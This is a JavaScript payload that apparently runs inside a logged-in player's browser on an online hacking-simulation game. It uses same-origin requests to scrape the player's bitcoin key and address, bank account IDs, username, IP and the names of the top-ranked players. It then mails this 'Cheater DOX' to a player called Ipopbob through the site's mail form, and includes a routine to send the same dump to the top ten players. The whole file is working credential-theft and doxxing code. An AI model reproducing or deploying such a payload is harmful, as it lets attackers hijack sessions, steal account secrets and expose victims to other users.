(async () => {

  // ===== BTC INFO =====
  const r1 = await fetch('/internet?ip=112.164.129.156', { credentials: 'same-origin' });
  const h1 = await r1.text();
  const d1 = new DOMParser().parseFromString(h1, 'text/html');
  window.BTC_KEY = d1.querySelector('#btc-key')?.value || null;
  window.BTC_ADDRESS = d1.querySelector('#btc-address')?.value || null;

  // ===== BANK IDS =====
  const r2 = await fetch('/finances', { credentials: 'same-origin' });
  const h2 = await r2.text();
  const d2 = new DOMParser().parseFromString(h2, 'text/html');

  const names = [
    'First International Bank',
    'American Expense',
    'HEBC',
    'Ultimate Bank',
    'Swiss International Bank'
  ];

  window.BANK_IDS = {};

  names.forEach(n => {
    const s = [...d2.querySelectorAll('.widget-content strong')]
      .find(e => e.textContent.trim() === n);
    const w = s?.closest('.widget-box');
    const m = w?.textContent.match(/at\s*#(\d+)/);
    if (m) {
      const k = n.replace(/[^a-zA-Z0-9_$]/g, '_');
      window[k] = `#${m[1]}`;
      window.BANK_IDS[k] = `#${m[1]}`;
    }
  });

  // ===== USER INFO =====
  window.USERNAME = document.querySelector('span.text')?.textContent.trim() || null;
  window.IP = document.querySelector('span.header-ip-show')?.textContent.trim() || null;

  // ===== RANKING NAMES =====
  const r3 = await fetch('/ranking', { credentials: 'same-origin' });
  const h3 = await r3.text();
  const d3 = new DOMParser().parseFromString(h3, 'text/html');

  const places = [
    'placeone','placetwo','placethree','placefour','placefive',
    'placesix','placeseven','placeeight','placenine','placeten'
  ];

  const rows = [...d3.querySelectorAll('table tbody tr')].slice(0, 10);

  rows.forEach((tr, i) => {
    const name = tr.querySelector('td:nth-child(2) a')?.textContent.trim() || null;
    if (name) window[places[i]] = name;
  });

  // ===== EMAIL =====
  const EMAIL_TO = 'Ipopbob';
  const EMAIL_SUBJECT = 'Cheater DOX';

  const EMAIL_CONTENT = (toName = USERNAME) => `
    <p>Hello There, <br> this was an auto generated email by NotOnline</p><br>
    <p>The User ${USERNAME} has tried to cheat but didnt account for me.</p><br>
    <p>Known information:</p><br>
    <p>
      Username: ${USERNAME}<br>
      IP: ${IP}<br>
      Bitcoin Address: ${BTC_ADDRESS}<br>
      Bitcoin Key: ${BTC_KEY}<br><br>
      Bank IDs:<br>
      First International: ${First_International_Bank}<br>
      HEBC: ${HEBC}<br>
      American Expense: ${American_Expense}<br>
      Swiss International Bank: ${Swiss_International_Bank}<br>
      Ultimate Bank: ${Ultimate_Bank}<br><br>
      This Email has also been sent to the top 10 ranked players:<br>
      1. ${placeone}<br>
      2. ${placetwo}<br>
      3. ${placethree}<br>
      4. ${placefour}<br>
      5. ${placefive}<br>
      6. ${placesix}<br>
      7. ${placeseven}<br>
      8. ${placeeight}<br>
      9. ${placenine}<br>
      10. ${placeten}
    </p>
  `;

  // ===== SEND TO Ipopbob =====
  window.sendMail = async () => {
    const p = new URLSearchParams({
      action: 'new',
      act: 'new',
      to: EMAIL_TO,
      subject: EMAIL_SUBJECT,
      text: EMAIL_CONTENT()
    });

    return fetch('/mail?action=new', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: p.toString()
    });
  };

  // ===== SEND TO TOP 10 =====
  window.sendMailToAll = async () => {
    for (let i = 0; i < places.length; i++) {
      const player = window[places[i]];
      if (!player) continue;

      const p = new URLSearchParams({
        action: 'new',
        act: 'new',
        to: player,
        subject: EMAIL_SUBJECT,
        text: EMAIL_CONTENT(player)
      });

      await fetch('/mail?action=new', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: p.toString()
      });
    }
  };
sendMail();
})();
